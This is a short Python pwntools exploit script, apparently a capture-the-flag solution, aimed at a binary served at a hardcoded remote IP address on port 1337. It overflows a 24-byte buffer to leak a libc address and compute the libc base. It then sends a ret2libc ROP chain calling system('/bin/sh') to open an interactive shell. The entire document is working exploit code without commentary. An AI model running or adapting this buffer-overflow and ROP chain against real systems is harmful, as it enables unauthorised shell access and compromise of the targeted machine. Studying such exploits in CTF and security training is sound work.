from pwn import *

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

gs = '''
break *$rebase(0x125d)
continue
'''

libc = ELF('./libc.so.6',checksec=False)

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.141.229.188',1337)
    else:
        return process(e.path)

p = start()

def leak_libc():
  chain = b'A'*24+chr(28).encode()
  chain = b'A'*24+b'\x1c'
  p.send(chain)
  p.recvuntil(b'Oooh you like AAAAAAAAAAAAAAAAAAAAAAAA')
  leak=u64(p.recvline().strip(b'\n')[0:6]+b'\x00\x00')
  libc_start_main = leak+(0x7fb2c9a0bdc0-0x7fb2c9a0bd1c)
  libc.address=libc_start_main-libc.sym['__libc_start_main']

def ret2system():
  r = ROP(libc)
  chain = b'A'*24
  chain += p64(r.find_gadget(['ret'])[0])
  chain += p64(r.find_gadget(['pop rdi','ret'])[0])
  chain += p64(next(libc.search(b'/bin/sh')))
  chain += p64(libc.sym['system'])
  p.sendline(chain)

leak_libc()
print("libc base",hex(libc.address))
ret2system()
p.interactive()
